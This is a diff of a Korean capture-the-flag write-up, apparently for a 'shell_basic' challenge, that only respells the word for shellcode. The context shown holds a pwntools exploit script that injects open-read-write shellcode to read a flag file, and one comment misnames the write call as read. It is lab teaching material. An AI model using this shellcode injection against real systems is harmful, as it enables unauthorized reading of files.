@@ -72,7 +72,7 @@ sc = (void *)shellcode; 이다.
 표준입력을 통해 shellcode의 값을 입력받고 
 
 이 값을 함수포인터에 type casting을 하여 대입하는 것이다. 
-그렇다면 함수포인터에는 shellcode의 시작주소가 담기게 될 것이기때문에 sc를 호출하는 순간 쉘코드를 실행시킬 수 있는 것이다.
+그렇다면 함수포인터에는 shellcode의 시작주소가 담기게 될 것이기때문에 sc를 호출하는 순간 셸코드를 실행시킬 수 있는 것이다.
 
 이 문제를 풀기위해서는 문제에서 제시한 플래그 파일을 읽어서 플래그를 획득(출력)해야한다. 
 즉 우리는 orw shellcode를 삽입한 exploit script를 작성하면 된다.
@@ -96,21 +96,21 @@ path = "/home/shell_basic/flag_name_is_loooooong"
 code = ''
 
 code += shellcraft.open(path,0 ,0)
-#shellcraft를 이용하여 open system call의 쉘코드를 사용.
+#shellcraft를 이용하여 open system call의 셸코드를 사용.
 
 code += shellcraft.read('rax','rsp',0x1000)
-#shellcraft를 이용하여 read system call의 쉘코드를 사용. 인자는 fd,buffer,count 순이다. 
+#shellcraft를 이용하여 read system call의 셸코드를 사용. 인자는 fd,buffer,count 순이다. 
 #fd 인자로 rax를 쓰는 이유는 open syscall의 반환 값이 rax에 저장되기 때문이다. 주의해야할 점은 buffer 인자로 rsp - count가 아니라 rsp 값을 대입해야한다.
 
 code += shellcraft.write(1,'rsp',0x1000)
-#shellcraft를 이용하여 read system call의 쉘코드를 사용. 인자는 fd,buffer,count 순이다. 
+#shellcraft를 이용하여 read system call의 셸코드를 사용. 인자는 fd,buffer,count 순이다. 
 #인자가 read와 같다.
 
 print(p.recv())
 #출력데이터 받아서 출력.
 
 p.sendline(asm(code)) 
-#작성한 쉘코드+'\n'를 기계어로 변환하여 전송 
+#작성한 셸코드+'\n'를 기계어로 변환하여 전송 
 
 print(p.recvuntil('}'))
 #플래그 형식은 DH{...}이므로 출력데이터를 '}'가 출력될 때까지 받아서 출력. 
